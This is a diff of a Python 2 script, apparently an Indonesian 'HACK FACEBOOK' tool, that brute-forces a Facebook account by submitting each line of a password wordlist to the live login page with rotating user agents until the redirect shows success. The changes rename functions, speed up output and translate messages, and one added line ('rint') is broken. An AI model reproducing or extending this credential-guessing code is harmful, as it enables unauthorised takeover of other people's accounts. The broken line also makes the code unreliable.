@@ -15,24 +15,22 @@ def runntek(s):
         for c in s + '\n':
                 sys.stdout.write(c)
                 sys.stdout.flush()
-                time.sleep(10. / 100)
+                time.sleep(10. / 1000)
 
-if sys.platform == "linux" or sys.platform == "linux2":
-     GL = "\033[96;1m" # Blue aqua
-     BB = "\033[34;1m" # Blue light
-     YY = "\033[33;1m" # Yellow light
-     GG = "\033[32;1m" # Green light
-     WW = "\033[0;1m"  # White light
-     RR = "\033[31;1m" # Red light
-     CC = "\033[36;1m" # Cyan light
-     B = "\033[34m"    # Blue
-     Y = "\033[33;1m"    # Yellow
-     G = "\033[32m"    # Green
-     W = "\033[0;1m"     # White
-     R = "\033[31m"    # Red
-     C = "\033[36;1m"    # Cyan
-     rand = (BB,YY,GG,WW,RR,CC)
-     P = random.choice(rand)
+GL = "\033[96;1m" # Blue aqua
+BB = "\033[34;1m" # Blue light
+YY = "\033[33;1m" # Yellow light
+GG = "\033[32;1m" # Green light
+WW = "\033[0;1m"  # White light
+RR = "\033[31;1m" # Red light
+CC = "\033[36;1m" # Cyan light
+B = "\033[34m"    # Blue
+Y = "\033[33;1m"    # Yellow
+G = "\033[32m"    # Green
+W = "\033[0;1m"     # White
+R = "\033[31m"    # Red
+C = "\033[36;1m"    # Cyan
+     
 def cover():
     print """
     
@@ -41,7 +39,7 @@ def cover():
     
      """
     runntek(GL+"           Assalamu'@laikum. ^_^...")
-    time.sleep(1)
+    time.sleep(0)
     print " "
     print RR+"  +============================================+"
     print GG+"  |••••••••   HACK FACEBOOK MAS ^_^   •••••••••|" 
@@ -74,11 +72,6 @@ login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 
 
-def runntek(s):
-        for c in s + '\n':
-                sys.stdout.write(c)
-                sys.stdout.flush()
-                time.sleep(10. / 100)
 
 def main():
         global br
@@ -90,8 +83,8 @@ def main():
         br.set_handle_equiv(True)
         br.set_handle_referer(True)
         br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-        welcome()
-        search()
+        njing()
+        bismilah()
         print " "
         runntek(RR+"  Wordlis Tidak Ada yang Cocok")
         runntek(RR+"  Kembangin Wordlistnya Sendiri Cuk")
@@ -108,7 +101,17 @@ def kol():
         os.sys.exit()
     else:
         exit(0)
-def brute(password):
+
+def bismilah():
+        global password
+        noobs = open(passwordlist,"r")
+        for password in noobs:
+                noobs = password.replace("\n","")
+                iqbalz(password)
+
+
+	
+def iqbalz(password):
         sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
         sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
@@ -120,37 +123,30 @@ def brute(password):
         log = sub.geturl()
         if log != login and (not 'login_attempt' in log):
                         print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password)) 
-                        print " "
+                    rint " "
                         raw_input(WW+"TEKAN ENTER UNTUK KELUAR.....")
                         sys.exit(1)
 
 
-def search():
-        global password
-        passwords = open(passwordlist,"r")
-        for password in passwords:
-                passwords = password.replace("\n","")
-                brute(password)
-
 
 #welcome
-def welcome():
-        wel = GG+"""
+def njing():
+        nuub = GG+"""
  ___      _           _
 |_ _|__ _| |__   __ _| |____   
  | |/ _` | '_ \ / _` | |_  /    
 ,| | (_| | |_) | (_| | |/ /_
-|___\__, |_.__/ \__,_|_/___/  \033[96;4mLife Of Programmer\033[92;1m
+|___\__, |_.__/ \__,_|_/___/  \033[96;1mLife Of Programmer\033[92;1m
        |_|
       """
-        print wel
+        print nuub
         print " "
-        total = open(passwordlist,"r")
-        total = total.readlines()
+        pass_tot = open(passwordlist,"r")
+        pass_tot = pass_tot.readlines()
         print " "
-        print GL+" [*] Account to crack : {}".format(email)
-        print RR+" [*] Jmlah :" , len(total),WW+ "passwords"
-        print Y+" [*] Cracking, please wait .....\n\n"
+        print GL+" [#] Sedang MengCrack : {}".format(email)
+        print RR+" [#] Jumlah :" , len(pass_tot),WW+ "password saat ini"
+        print Y+" [#] Tunggu Proses Cracking Password .....\n\n"
 
 if __name__ == '__main__':
         main()
